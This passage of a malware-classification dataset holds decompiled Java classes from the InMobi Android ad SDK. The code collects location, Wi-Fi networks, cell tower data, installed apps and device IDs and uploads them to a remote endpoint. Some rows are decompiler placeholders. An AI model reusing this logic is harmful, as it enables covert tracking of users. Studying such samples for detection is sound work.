"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.internal\InternalSDKUtil.code","public class InternalSDKUtil {   public static final String BASE_LOG_TAG=""[InMobi]"";   public static final String INMOBI_SDK_RELEASE_DATE=""20140131"";   public static final String INMOBI_SDK_RELEASE_VERSION=""4.1.1"";   public static final String LOGGING_TAG=""[InMobi]-4.1.1"";   public static final String PRODUCT_COMMONS=""commons"";   private static String b;   private static CommonsConfig a=new CommonsConfig();   private static Context c=null;   private static Map<String,String> d=new HashMap();   private static CacheController.Validator e=new d();   private static boolean f=true;   public static Context getContext(){     return c;   }   public static void setContext(  Context context){     if (c == null) {       c=context.getApplicationContext();       if (InMobi.getAppId() != null) {         a();         try {           CacheController.getConfig(PRODUCT_COMMONS,context,d,e);         }  catch (        CommonsException e2) {           Log.internal(PRODUCT_COMMONS,""Unable retrive config for commons product"");         }       }     }   }   public static void initialize(  Context context){     if (getContext() == null) {       if (context == null) {         c.getApplicationContext();       }  else {         c=context.getApplicationContext();       }     }     if (InMobi.getAppId() != null) {       if (f) {         f=false;         a();       }       try {         a(CacheController.getConfig(PRODUCT_COMMONS,context,d,e).getData());       }  catch (      CommonsException e2) {         Log.debug(LOGGING_TAG,""IMCommons config init: IMCommonsException caught. Reason: "" + e2.toString());       } catch (      Exception e3) {         Log.debug(LOGGING_TAG,""Exception while getting commons config data."");       }     }   }   public static boolean a(  Map<String,Object> map){     a();     try {       CommonsConfig commonsConfig=new CommonsConfig();       commonsConfig.setFromMap(map);       a=commonsConfig;       ApiStatCollector.getLogger().setMetricConfigParams(commonsConfig.getApiStatsConfig());       return true;     }  catch (    Exception e2) {       e2.printStackTrace();       return false;     }   }   private static void a(){     d=UIDUtil.getMap(getContext(),null);   }   public static CommonsConfig getConfig(){     return a;   }   public static String getSavedUserAgent(){     return b;   }   public static String getUserAgent(  Context context){     try {       if (b == null) {         if (Build.VERSION.SDK_INT >= 17) {           b=a.a(context);         }  else {           b=new WebView(context).getSettings().getUserAgentString();         }       }       return b;     }  catch (    Exception e2) {       Log.internal(LOGGING_TAG,""Cannot get user agent"",e2);       return b;     }   } public static class a {     a(){     }     static String a(    Context context){       return WebSettings.getDefaultUserAgent(context);     }   }   public static boolean validateAppId(  String str){     if (str == null) {       Log.debug(LOGGING_TAG,""appId is null"");       return false;     }     if (str.matches(""(x)+"")) {       Log.debug(LOGGING_TAG,""appId is all xxxxxxx"");       return false;     }     if ("""".equals(str.trim())) {       Log.debug(LOGGING_TAG,""appId is all blank"");       return false;     }     return true;   }   public static String getConnectivityType(  Context context){     ConnectivityManager connectivityManager;     try {       if (context.checkCallingOrSelfPermission(""android.permission.ACCESS_NETWORK_STATE"") == 0 && (connectivityManager=(ConnectivityManager)context.getSystemService(""connectivity"")) != null) {         NetworkInfo activeNetworkInfo=connectivityManager.getActiveNetworkInfo();         int type=activeNetworkInfo.getType();         int subtype=activeNetworkInfo.getSubtype();         if (type == 1) {           return ""wifi"";         }         if (type == 0) {           if (subtype == 1) {             return ""gprs"";           }           if (subtype == 2) {             return ""edge"";           }           if (subtype == 3) {             return ""umts"";           }           if (subtype != 0) {             return ""carrier"";           }           return ""carrier"";         }       }       return null;     }  catch (    Exception e2) {       Log.internal(LOGGING_TAG,""Error getting the network info"",e2);       return null;     }   }   public static int getDisplayRotation(  Display display){     Method method=null;     try {       method=Display.class.getMethod(""getRotation"",(Class[])null);     }  catch (    NoSuchMethodException e2) {       try {         method=Display.class.getMethod(""getOrientation"",(Class[])null);       }  catch (      NoSuchMethodException e3) {         Log.internal(PRODUCT_COMMONS,""Unable to access getOrientation method via reflection"");       }     }     if (method != null) {       try {         return ((Integer)method.invoke(display,(Object[])null)).intValue();       }  catch (      Exception e4) {         Log.internal(PRODUCT_COMMONS,""Unable to access display rotation"");       }     }     return -999;   }   public static boolean isDefOrientationLandscape(  int i,  int i2,  int i3){     if (i2 <= i3 || !(i == 0 || i == 2)) {       return i2 < i3 && (i == 1 || i == 3);     }     return true;   }   public static boolean isTablet(  Context context){     Display defaultDisplay=((WindowManager)context.getSystemService(""window"")).getDefaultDisplay();     DisplayMetrics displayMetrics=new DisplayMetrics();     defaultDisplay.getMetrics(displayMetrics);     double d2=displayMetrics.widthPixels / displayMetrics.xdpi;     double d3=displayMetrics.heightPixels / displayMetrics.ydpi;     return Math.sqrt((d3 * d3) + (d2 * d2)) > 7.0d;   }   public static boolean checkNetworkAvailibility(  Context context){     if (context == null) {       return false;     }     try {       ConnectivityManager connectivityManager=(ConnectivityManager)context.getSystemService(""connectivity"");       if (connectivityManager.getActiveNetworkInfo() == null) {         return false;       }       return connectivityManager.getActiveNetworkInfo().isConnected();     }  catch (    Exception e2) {       Log.internal(LOGGING_TAG,""Cannot check network state"",e2);       return false;     }   }   public static long getLongFromJSON(  JSONObject jSONObject,  String str,  long j){     try {       return jSONObject.getLong(str);     }  catch (    Exception e2) {       try {         Log.debug(LOGGING_TAG,""JSON with property "" + str + "" found but has bad datatype(""+ jSONObject.get(str).getClass()+ ""). Reverting to ""+ j);         return j;       }  catch (      JSONException e3) {         return j;       }     }   }   public static int getIntFromJSON(  JSONObject jSONObject,  String str,  int i){     try {       return jSONObject.getInt(str);     }  catch (    Exception e2) {       try {         Log.debug(LOGGING_TAG,""JSON with property "" + str + "" found but has bad datatype(""+ jSONObject.get(str).getClass()+ ""). Reverting to ""+ i);         return i;       }  catch (      JSONException e3) {         return i;       }     }   }   public static boolean getBooleanFromJSON(  JSONObject jSONObject,  String str,  boolean z){     try {       return jSONObject.getBoolean(str);     }  catch (    Exception e2) {       try {         Log.debug(LOGGING_TAG,""JSON with property "" + str + "" found but has bad datatype(""+ jSONObject.get(str).getClass()+ ""). Reverting to ""+ z);         return z;       }  catch (      JSONException e3) {         return z;       }     }   }   public static String getStringFromJSON(  JSONObject jSONObject,  String str,  String str2){     try {       return jSONObject.getString(str);     }  catch (    Exception e2) {       try {         Log.debug(LOGGING_TAG,""JSON with property "" + str + "" found but has bad datatype(""+ jSONObject.get(str).getClass()+ ""). Reverting to ""+ str2);         return str2;       }  catch (      JSONException e3) {         return str2;       }     }   }   public static java.lang.String getFinalRedirectedUrl(  java.lang.String r6){     throw new UnsupportedOperationException(""Method not decompiled: com.inmobi.commons.internal.InternalSDKUtil.getFinalRedirectedUrl(java.lang.String):java.lang.String"");   }   public static void addCommonPropertiesToConnection(  HttpURLConnection httpURLConnection){     String userAgent=getUserAgent(getContext());     if (userAgent != null) {       httpURLConnection.setRequestProperty(""User-Agent"",userAgent);     }   }   public static void populate(  Map<String,Object> map,  Map<String,Object> map2,  boolean z){     for (    String str : map.keySet()) {       if (map2.get(str) == null) {         map2.put(str,map.get(str));       }       Object obj=map.get(str);       Object obj2=map2.get(str);       if ((obj instanceof Map) && (obj2 instanceof Map)) {         if (!z) {           map2.put(str,obj);         }  else {           populate((Map<String,Object>)obj,(Map<String,Object>)obj2,true);         }       }  else {         map2.put(str,obj);       }     }   }   public static Map<String,Object> populateToNewMap(  Map<String,Object> map,  Map<String,Object> map2,  boolean z){     HashMap hashMap=new HashMap();     populate(map2,(Map<String,Object>)hashMap,false);     populate(map,hashMap,z);     return hashMap;   }   public static boolean getBooleanFromMap(  Map<String,Object> map,  String str){     Object obj=map.get(str);     if (obj instanceof Boolean) {       return ((Boolean)obj).booleanValue();     }     Log.internal(LOGGING_TAG,""Key "" + str + "" has illegal value"");     throw new IllegalArgumentException();   }   public static long getLongFromMap(  Map<String,Object> map,  String str,  long j,  long j2){     Object obj=map.get(str);     if (obj instanceof Long) {       long longValue=((Long)obj).longValue();       if (longValue <= j2 && longValue >= j) {         return longValue;       }     }     if (j < -2147483648L) {       j=-2147483648L;     }     int i=(int)j;     if (j2 > 2147483647L) {       j2=2147483647L;     }     return getIntFromMap(map,str,i,(int)j2);   }   public static int getIntFromMap(  Map<String,Object> map,  String str,  int i,  long j){     Object obj=map.get(str);     if (obj instanceof Integer) {       int intValue=((Integer)obj).intValue();       if (intValue <= j && intValue >= i) {         return intValue;       }     }     Log.internal(LOGGING_TAG,""Key "" + str + "" has illegal value"");     throw new IllegalArgumentException();   }   public static String getStringFromMap(  Map<String,Object> map,  String str){     Object obj=map.get(str);     if (obj instanceof String) {       return (String)obj;     }     Log.internal(LOGGING_TAG,""Key "" + str + "" has illegal value"");     throw new IllegalArgumentException();   }   public static void populate(  JSONObject jSONObject,  JSONObject jSONObject2,  boolean z) throws JSONException {     Iterator<String> keys=jSONObject.keys();     while (keys.hasNext()) {       String next=keys.next();       try {         jSONObject2.get(next);         try {           Object obj=jSONObject.get(next);           Object obj2=jSONObject2.get(next);           if ((obj instanceof JSONObject) && (obj2 instanceof JSONObject)) {             if (!z) {               jSONObject2.put(next,obj);             }  else {               populate((JSONObject)obj,(JSONObject)obj2,true);             }           }  else {             jSONObject2.put(next,obj);           }         }  catch (        JSONException e2) {           Log.internal(LOGGING_TAG,""Cannot populate to json exception"",e2);         }       }  catch (      JSONException e3) {         jSONObject2.put(next,jSONObject.get(next));       }     }   }   public static JSONObject populateToNewJSON(  JSONObject jSONObject,  JSONObject jSONObject2,  boolean z) throws JSONException {     JSONObject jSONObject3=new JSONObject();     populate(jSONObject2,jSONObject3,false);     populate(jSONObject,jSONObject3,z);     return jSONObject3;   }   public static boolean isInitializedSuccessfully(  boolean z){     if (getContext() != null && InMobi.getAppId() != null) {       return true;     }     if (z) {       Log.debug(LOGGING_TAG,""InMobi not initialized. Call InMobi.initialize before using any InMobi API"");     }     return false;   }   public static boolean isInitializedSuccessfully(){     return isInitializedSuccessfully(true);   }   public static String getInMobiInternalVersion(  String str){     String[] split=str.split(""[.]"");     StringBuffer stringBuffer=new StringBuffer("""");     for (    String str2 : split) {       try {         stringBuffer.append(""T"").append((char)(Integer.valueOf(str2).intValue() + 65));       }  catch (      NumberFormatException e2) {       }     }     return stringBuffer.equals("""") ? """" : stringBuffer.substring(1).toString();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.internal\JSONPayloadCreator.code","public class JSONPayloadCreator implements PayloadCreator {   @Override public String toPayloadString(  List<Sample> list,  List<ActivityRecognitionSampler.ActivitySample> list2,  Context context){     JSONObject a;     JSONObject a2;     JSONObject jSONObject=new JSONObject();     JSONArray jSONArray=new JSONArray();     ThinICEConfig thinIceConfig=AnalyticsInitializer.getConfigParams().getThinIceConfig();     for (    Sample sample : list) {       if (sample != null && (a2=a(sample,thinIceConfig)) != null) {         jSONArray.put(a2);       }     }     for (    ActivityRecognitionSampler.ActivitySample activitySample : list2) {       if (activitySample != null && (a=a(activitySample)) != null) {         jSONArray.put(a);       }     }     JSONObject a3=a();     if (a3 != null) {       jSONArray.put(a3);     }     try {       if (jSONArray.length() > 0) {         jSONObject.put(""payload"",jSONArray);       }       CellOperatorInfo cellNetworkInfo=CellUtil.getCellNetworkInfo(context);       if (thinIceConfig.isOperatorEnabled()) {         if (!ThinICEConfigSettings.bitTest(thinIceConfig.getCellOpsFlag(),1) && (cellNetworkInfo.simMcc != -1 || cellNetworkInfo.simMnc != -1)) {           jSONObject.put(""s-ho"",cellNetworkInfo.simMcc + ""_"" + cellNetworkInfo.simMnc);         }         if (!ThinICEConfigSettings.bitTest(thinIceConfig.getCellOpsFlag(),2) && (cellNetworkInfo.currentMcc != -1 || cellNetworkInfo.currentMnc != -1)) {           jSONObject.put(""s-co"",cellNetworkInfo.currentMcc + ""_"" + cellNetworkInfo.currentMnc);         }       }       Calendar calendar=Calendar.getInstance();       System.currentTimeMillis();       jSONObject.put(""tz"",calendar.get(15) + calendar.get(16));       jSONObject.put(AnalyticsSQLiteHelper.EVENT_LIST_TS,calendar.getTimeInMillis());       jSONObject.put(""mk-version"",""pr-SAND-"" + InternalSDKUtil.getInMobiInternalVersion(""4.1.1"") + ""-""+ InternalSDKUtil.INMOBI_SDK_RELEASE_DATE);       String currentLocationStr=currentLocationStr();       if (currentLocationStr != null && !"""".equals(currentLocationStr)) {         jSONObject.put(""u-latlong-accu"",currentLocationStr);       }       Map<String,String> map=UIDUtil.getMap(context,null);       map.remove(""ua"");       map.remove(""s-ver"");       UIDUtil.bindToJSON(map,jSONObject);       return jSONObject.toString();     }  catch (    JSONException e) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Unable to create payload for sending ThinICE params"");       return null;     }   }   public static String currentLocationStr(){     StringBuilder sb=new StringBuilder();     if (sb == null || !LocationInfo.isValidGeoInfo()) {       return """";     }     sb.append(LocationInfo.getLat());     sb.append("","");     sb.append(LocationInfo.getLon());     sb.append("","");     sb.append((int)LocationInfo.getLocAccuracy());     return sb.toString();   }   private JSONObject a(){     JSONArray installedApps=AppDetectionManager.getInstalledApps();     if (installedApps == null || installedApps.length() == 0) {       return null;     }     try {       JSONObject jSONObject=new JSONObject();       jSONObject.put(""t"",2);       jSONObject.put(AnalyticsSQLiteHelper.EVENT_LIST_TS,System.currentTimeMillis());       jSONObject.put(""a-meta"",installedApps);       return jSONObject;     }  catch (    Exception e) {       return null;     }   }   private JSONObject a(  ActivityRecognitionSampler.ActivitySample activitySample){     try {       JSONObject jSONObject=new JSONObject();       jSONObject.put(""t"",3);       jSONObject.put(AnalyticsSQLiteHelper.EVENT_LIST_TS,activitySample.getTimestamp());       jSONObject.put(""a"",activitySample.getActivity());       return jSONObject;     }  catch (    Exception e) {       return null;     }   }   private JSONObject a(  Sample sample,  ThinICEConfig thinICEConfig){     try {       JSONObject jSONObject=new JSONObject();       jSONObject.put(""t"",1);       if (thinICEConfig.isConnectedWifiEnabled()) {         jSONObject.put(""c-ap"",a(sample.connectedWifiAp));       }       if (thinICEConfig.isCellEnabled()) {         jSONObject.put(""c-sc"",a(sample.connectedCellTowerInfo));       }       if (thinICEConfig.isVisibleWifiEnabled()) {         JSONArray jSONArray=new JSONArray();         if (sample.visibleWifiAp != null) {           Iterator<WifiInfo> it=sample.visibleWifiAp.iterator();           while (it.hasNext()) {             JSONObject a=a(it.next());             if (a != null) {               jSONArray.put(a);             }           }         }         if (jSONArray.length() > 0) {           jSONObject.put(""v-ap"",jSONArray);         }       }       if (jSONObject.length() <= 1) {         return null;       }       jSONObject.put(AnalyticsSQLiteHelper.EVENT_LIST_TS,sample.utc);       return jSONObject;     }  catch (    JSONException e) {       return null;     }   }   private JSONObject a(  WifiInfo wifiInfo){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""bssid"",wifiInfo.bssid);       jSONObject.put(""essid"",wifiInfo.ssid);       return jSONObject;     }  catch (    Exception e) {       return null;     }   }   private JSONObject a(  CellTowerInfo cellTowerInfo){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(AnalyticsEvent.EVENT_ID,cellTowerInfo.id);       if (cellTowerInfo.signalStrength != 0) {         jSONObject.put(AnalyticsEvent.TYPE_START_SESSION,cellTowerInfo.signalStrength);         return jSONObject;       }       return jSONObject;     }  catch (    Exception e) {       return null;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.internal\Log.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6685ab7e"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.internal\PayloadCreator.code","public interface PayloadCreator {   String toPayloadString(  List<Sample> list,  List<ActivityRecognitionSampler.ActivitySample> list2,  Context context); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.internal\ThinICE.code","public final class ThinICE {   private static boolean a=false;   private static ThinICEListener b=new com.inmobi.commons.internal.b();   private static Timer c=new Timer();   private ThinICE(){   }   public static void setConfig(  ThinICEConfig thinICEConfig){     if (thinICEConfig != null) {       ThinICEConfigSettings thinICEConfigSettings=new ThinICEConfigSettings();       thinICEConfigSettings.setEnabled(thinICEConfig.isEnabled());       thinICEConfigSettings.setSampleCellEnabled(thinICEConfig.isCellEnabled());       thinICEConfigSettings.setSampleCellOperatorEnabled(thinICEConfig.isOperatorEnabled());       thinICEConfigSettings.setSampleConnectedWifiEnabled(thinICEConfig.isConnectedWifiEnabled());       thinICEConfigSettings.setSampleHistorySize(thinICEConfig.getSampleHistorySize());       thinICEConfigSettings.setSampleInterval(thinICEConfig.getSampleInterval() * 1000);       thinICEConfigSettings.setSampleLocationEnabled(true);       thinICEConfigSettings.setSampleVisibleWifiEnabled(thinICEConfig.isVisibleWifiEnabled());       thinICEConfigSettings.setStopRequestTimeout(thinICEConfig.getStopRequestTimeout() * 1000);       thinICEConfigSettings.setWifiFlags(thinICEConfig.getWifiFlags());       thinICEConfigSettings.setCellOpFlags(thinICEConfig.getCellOpsFlag());       IceDataCollector.setConfig(thinICEConfigSettings);     }   }   public static void start(  Activity activity) throws CommonsException {     if (InternalSDKUtil.isInitializedSuccessfully(false)) {       a(activity);       if (Build.VERSION.SDK_INT < 14) {         IceDataCollector.start(activity);       }       ActivityRecognitionSampler.start();     }   }   public static void stop(  Activity activity) throws CommonsException {     a(activity);     if (Build.VERSION.SDK_INT < 14) {       b();     }   }   public static void b(){     List<Sample> data=IceDataCollector.getData();     IceDataCollector.stop();     b(data);     ActivityRecognitionSampler.stop();   }   private static void a(  Activity activity) throws CommonsException {     if (!a && activity == null) {       throw new CommonsException(1);     }     if (!a) {       if (Build.VERSION.SDK_INT >= 14) {         ApplicationFocusManager.init(activity);         ApplicationFocusManager.addFocusChangedListener(new a());         IceDataCollector.start(activity.getApplicationContext());       }  else {         IceDataCollector.setListener(b);       }       a=true;     }     InternalSDKUtil.initialize(activity.getApplicationContext());   } public static class a implements ApplicationFocusManager.FocusChangedListener {     a(){     }     @Override public void onFocusChanged(    boolean z){       if (!z) {         ThinICE.b();       }  else {         IceDataCollector.start(InternalSDKUtil.getContext());       }     }   }   public static void b(  List<Sample> list){     if (list.size() == 0 && ActivityRecognitionSampler.getCollectedList().size() == 0) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""No ThinICE data is collected. NoOp."");       return;     }     if (!AnalyticsInitializer.getConfigParams().getThinIceConfig().isEnabled()) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""ThisICE disabled. Not sending data. NoOp."");       return;     }     RetryMechanism retryMechanism=new RetryMechanism((int)AnalyticsInitializer.getConfigParams().getThinIceConfig().getMaxRetry(),((int)AnalyticsInitializer.getConfigParams().getThinIceConfig().getRetryInterval()) * 1000,c);     String payloadString=new JSONPayloadCreator().toPayloadString(list,ActivityRecognitionSampler.getCollectedList(),InternalSDKUtil.getContext());     Log.internal(InternalSDKUtil.LOGGING_TAG,""Sending "" + list.size() + "" ThinICE params to server ""+ payloadString);     retryMechanism.rescheduleTimer(new b(payloadString));   } public static class b implements RetryMechanism.RetryRunnable {     final String a;     b(    String str){       this.a=str;     }     @Override public void run() throws Exception {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Sending ThinICE data to server "" + AnalyticsInitializer.getConfigParams().getThinIceConfig().getEndpointUrl());       if (InternalSDKUtil.checkNetworkAvailibility(InternalSDKUtil.getContext())) {         ThinICE.b(this.a);         return;       }       throw new Exception(""Device not connected."");     }     @Override public void completed(){     }   }   public static void b(  String str) throws IOException {     HttpURLConnection httpURLConnection=(HttpURLConnection)new URL(AnalyticsInitializer.getConfigParams().getThinIceConfig().getEndpointUrl()).openConnection();     InternalSDKUtil.addCommonPropertiesToConnection(httpURLConnection);     httpURLConnection.setDoOutput(true);     httpURLConnection.setDoInput(false);     OutputStreamWriter outputStreamWriter=new OutputStreamWriter(httpURLConnection.getOutputStream());     outputStreamWriter.write(str);     outputStreamWriter.flush();     outputStreamWriter.close();     httpURLConnection.getResponseCode();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.internal\WrapperFunctions.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6d2e16c5"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.metric\a.code","public class a implements Runnable {   a(){   }   @Override public void run(){     Logger.this.c.sendFile();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.metric\EventLog.code","public class EventLog {   private EventType a;   private JSONObject b;   public EventLog(  EventType eventType,  JSONObject jSONObject){     this.a=eventType;     this.b=jSONObject;   }   public String toString(){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""t"",this.a.getValue());       jSONObject.put(""v"",this.b);     }  catch (    Exception e) {       Log.debug(InternalSDKUtil.LOGGING_TAG,""Unable to log json."",e);     }     return jSONObject.toString();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.metric\EventType.code","public interface EventType {   int getValue(); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.metric\Logger.code","public class Logger {   private Storage c;   private MetricConfigParams a=new MetricConfigParams();   private Integer b=2147483646;   private Queuer d=new Queuer();   private MetricsCallback e=null; public interface MetricsCallback {     void dataCollected(    EventLog eventLog);     void movedMetricDataToFileMemory(    String str);     void reportingFailure();     void reportingStartedWithRequest(    String str);     void reportingSuccess();   }   public Logger(  int i,  String str){     this.c=null;     this.c=new Storage(i,str,this.d,this.a);   }   public Logger(  int i,  String str,  Storage.PreProcessor preProcessor){     this.c=null;     this.c=new Storage(i,str,this.d,this.a,preProcessor);   }   public void setMetricConfigParams(  MetricConfigParams metricConfigParams){     if (metricConfigParams != null) {       this.a=metricConfigParams;       this.c.a=metricConfigParams;     }   }   protected void finalize() throws Throwable {     this.c.saveToLatest();     super.finalize();   }   public void logEvent(  EventLog eventLog){     this.c.readNumberOfEventsAndTimeStampFromPersistent();     if (this.e != null) {       this.e.dataCollected(eventLog);     }     this.d.log(eventLog);     if (this.d.a() >= this.a.getDumpThreshhold()) {       this.c.saveLocalCache();     }     if (this.c.getEvents() >= this.a.getMaxInQueue() || this.c.getTimestamp() + this.a.getNextRetryInterval() <= System.currentTimeMillis() / 1000) {       new Thread(new a()).start();     }   } public class a implements Runnable {     a(){     }     @Override public void run(){       Logger.this.c.sendFile();     }   }   public boolean startNewSample(){     boolean z=false; synchronized (this.b) {       Integer num=this.b;       this.b=Integer.valueOf(this.b.intValue() + 1);       if (this.b.intValue() >= this.a.getSamplingFactor()) {         this.b=0;         z=true;       }     }     return z;   }   public void setCallback(  MetricsCallback metricsCallback){     this.e=metricsCallback;     this.c.setCallback(metricsCallback);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.metric\MetricConfigParams.code","public class MetricConfigParams {   private int a=ProductCacheConfig.DEFAULT_EXPIRY;   private int b=1000;   private int c=1000;   private int d=10;   private String e="""";   public int getNextRetryInterval(){     return this.a;   }   public int getMaxInQueue(){     return this.b;   }   public int getSamplingFactor(){     return this.c;   }   public String getUrl(){     return this.e;   }   public int getDumpThreshhold(){     return this.d;   }   public void setFromMap(  Map<String,Object> map){     this.c=InternalSDKUtil.getIntFromMap(map,""sf"",1,2147483647L);     this.d=InternalSDKUtil.getIntFromMap(map,""dt"",1,2147483647L);     this.b=InternalSDKUtil.getIntFromMap(map,""max"",1,2147483647L);     this.a=InternalSDKUtil.getIntFromMap(map,""nri"",1,2147483647L);     this.e=InternalSDKUtil.getStringFromMap(map,""url"");   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.metric\MetricEndPoint.code","public class MetricEndPoint {   public static void sendData(  String str,  String str2) throws IOException {     HttpURLConnection httpURLConnection=(HttpURLConnection)new URL(str).openConnection();     InternalSDKUtil.addCommonPropertiesToConnection(httpURLConnection);     httpURLConnection.setDoOutput(true);     httpURLConnection.setDoInput(false);     OutputStreamWriter outputStreamWriter=new OutputStreamWriter(httpURLConnection.getOutputStream());     outputStreamWriter.write(str2);     outputStreamWriter.flush();     outputStreamWriter.close();     httpURLConnection.getResponseCode();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.metric\MetricsCallback.code","public interface MetricsCallback {   void dataCollected(  EventLog eventLog);   void movedMetricDataToFileMemory(  String str);   void reportingFailure();   void reportingStartedWithRequest(  String str);   void reportingSuccess(); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.metric\PreProcessor.code","public interface PreProcessor {   JSONObject process(  JSONObject jSONObject); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.metric\Queuer.code","public class Queuer {   private StringBuffer a=new StringBuffer();   private long b=0;   public long a(){     return this.b;   }   public void log(  EventLog eventLog){ synchronized (this.a) {       this.a.append(eventLog.toString()).append(',');       this.b++;     }   }   public String get(){     String stringBuffer;     Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,""Reading from queue""); synchronized (this.a) {       stringBuffer=this.a.toString();     }     return stringBuffer;   }   public void reset(){     Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,""Resetting queue""); synchronized (this.a) {       this.a=new StringBuffer();       this.b=0L;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.metric\Storage.code","public class Storage {   MetricConfigParams a;   private String b;   private String c;   private String d;   private int e;   private PreProcessor f;   private Queuer g;   private long h;   private long i;   private AtomicBoolean j;   private AtomicBoolean k;   private Logger.MetricsCallback l; public interface PreProcessor {     JSONObject process(    JSONObject jSONObject);   }   public void setCallback(  Logger.MetricsCallback metricsCallback){     this.l=metricsCallback;   }   public Storage(  int i,  String str,  Queuer queuer,  MetricConfigParams metricConfigParams){     this.b=""inmobi.cache.data"";     this.c=""inmobi.cache.data.events.number"";     this.d=""inmobi.cache.data.events.timestamp"";     this.e=0;     this.f=null;     this.g=null;     this.a=null;     this.h=-1L;     this.i=-1L;     this.j=new AtomicBoolean(false);     this.k=new AtomicBoolean(false);     this.l=null;     this.a=metricConfigParams;     this.g=queuer;     this.e=i;     this.b+=""."" + str;     this.c+=""."" + str;     this.d+=""."" + str;   }   public Storage(  int i,  String str,  Queuer queuer,  MetricConfigParams metricConfigParams,  PreProcessor preProcessor){     this(i,str,queuer,metricConfigParams);     this.f=preProcessor;   }   public long getEvents(){     return this.h;   }   public long getTimestamp(){     return this.i;   }   public void setPreprocessor(  PreProcessor preProcessor){     this.f=preProcessor;   }   public String readLocalCache(){     try {       return FileOperations.readFileAsString(InternalSDKUtil.getContext(),this.b);     }  catch (    Exception e) {       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Unable to read metric info."");       return ""null,"";     }   }   public void readNumberOfEventsAndTimeStampFromPersistent(){     if (this.h == -1) {       try {         this.h=Long.parseLong(FileOperations.readFileAsString(InternalSDKUtil.getContext(),this.c));         this.i=Long.parseLong(FileOperations.readFileAsString(InternalSDKUtil.getContext(),this.d));       }  catch (      Exception e) {         this.h=0L;       }       if (this.i == -1) {         this.i=System.currentTimeMillis() / 1000;         a();       }     }   }   private void a(){     try {       FileOperations.writeStringToFile(InternalSDKUtil.getContext(),this.c,"""" + this.h,false);       FileOperations.writeStringToFile(InternalSDKUtil.getContext(),this.d,"""" + this.i,false);     }  catch (    Exception e) {       this.h=0L;     }   }   public void saveLocalCache(){     if (this.j.compareAndSet(false,true)) {       if (this.l != null) {         this.l.movedMetricDataToFileMemory(this.b);       }       try {         FileOperations.writeStringToFile(InternalSDKUtil.getContext(),this.b,this.g.get(),true);         this.h+=this.g.a();         this.g.reset();         a();       }  catch (      IOException e) {         Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Someting went wrong while saving metrics log to persistent storage"",e);       }       this.j.set(false);       try { synchronized (this.j) {           this.j.notify();         }       }  catch (      Exception e2) {         Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Error saving local cache"",e2);       }     }   }   public void resetFile(){     try {       FileOperations.writeStringToFile(InternalSDKUtil.getContext(),this.b,"""",false);       this.h=0L;       this.i=System.currentTimeMillis() / 1000;       a();     }  catch (    IOException e) {       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Someting went wrong while saving metrics log to persistent storage"",e);     }   }   public void sendFile(){     if (!this.k.compareAndSet(false,true)) {       return;     }     while (!this.j.compareAndSet(false,true)) {       try { synchronized (this.j) {           this.j.wait();         }       }  catch (      Exception e) {         Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Unable to get lock for reading file before sending metric data"");         return;       }     }     if (this.l != null) {       this.l.reportingStartedWithRequest(this.a.getUrl());     }     try {       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Sending "" + this.h + "" events to server.."");       String readLocalCache=readLocalCache();       JSONObject jSONObject=new JSONObject();       UIDUtil.bindToJSON(UIDUtil.getMap(InternalSDKUtil.getContext(),null),jSONObject);       Calendar calendar=Calendar.getInstance();       jSONObject.put(""tz"",calendar.get(15));       jSONObject.put(AnalyticsSQLiteHelper.EVENT_LIST_TS,calendar.getTimeInMillis());       jSONObject.put(""product"",this.e);       jSONObject.put(""payload"",new JSONArray(""["" + readLocalCache.substring(0,readLocalCache.length() - 1) + 